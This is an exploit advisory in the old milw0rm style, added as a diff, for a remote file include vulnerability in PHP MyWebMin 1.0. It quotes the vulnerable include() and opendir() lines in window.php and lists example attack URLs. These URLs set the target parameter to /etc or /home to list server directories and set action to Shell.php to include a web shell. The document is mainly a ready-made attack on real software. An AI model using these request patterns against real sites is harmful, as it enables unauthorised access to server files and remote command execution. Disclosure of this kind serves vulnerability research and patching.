@@ -1,0 +1,34 @@
+#######################################
++PHP MyWebMin 1.0 Remote File Include
++Advisory #5
++Product :PHP MyWebMin
++Develop:
++www.josh.ch/joshch/php-tools/phpmywebmin,download.html
++Vulnerable: Remote File Includes
++Risk:High
++Class:Remote
++Discovered:by Kernel-32
++Contact: kernel-32@linuxmail.org
++Homepage: http://kernel-32.blogspot.com
++Greetz: BeLa ;)
+########################################
+
+Vulnerable File:window.php
+$ordner = opendir("$target");
+?>
+
+and
+
+include("$target/preferences.php");
+
+if($action != "")
+{
+include("$action.php");
+?>
+
+Examples:
+http://site/path/window.php?target=/etc
+http://site/path/home.php?target=/home
+http://site/path/window.php?action=Shell.php
+
+# milw0rm.com [2006-09-28]
